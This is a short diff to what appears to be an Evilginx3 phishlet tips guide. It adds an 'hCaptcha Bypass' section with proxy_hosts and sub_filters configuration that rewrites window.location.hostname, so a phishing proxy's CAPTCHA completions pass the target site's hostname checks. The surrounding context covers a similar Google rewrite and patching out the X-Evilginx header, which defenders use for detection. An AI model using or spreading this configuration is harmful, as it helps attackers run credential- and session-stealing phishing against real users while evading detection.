@@ -86,6 +86,16 @@ sub_filters:
   - {triggers_on: 'www.gstatic.com', orig_sub: 'accounts', domain: 'safe-domain.com', search: "\\(window.location.href\\)", replace: '(window.location.href.replace("{hostname}", "{orig_hostname}"))', mimes: ['text/javascript']}
 ```
 
+### hCaptcha Bypass
+hCaptcha does not validate the hostname of the website where it is loaded. However, during [server-side verification](https://docs.hcaptcha.com/#verify-the-user-response-server-side) of the CAPTCHA response, hCaptcha includes the hostname of the site where the challenge was completed. Since some websites may validate this hostname, tricking hCaptcha into believing it was loaded on the original hostname can be beneficial.
+```
+proxy_hosts:
+  - {phish_sub: 'hcaptcha', orig_sub: '', domain: 'hcaptcha.com', session: true, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'hcaptcha.com', orig_sub: '', domain: 'democaptcha.com', search: 'window.location.hostname', replace: 'window.location.hostname.replace("{hostname}", "{orig_hostname}")', mimes: ['application/javascript']}
+```
+
 ### Evilginx3 Easter Egg Patch (X-Evilginx Header)
 - Evilginx3 contains easter egg code which adds a `X-Evilginx` header with each request.
 - This header contains the Attacker Domain name. So it can be used for detection.
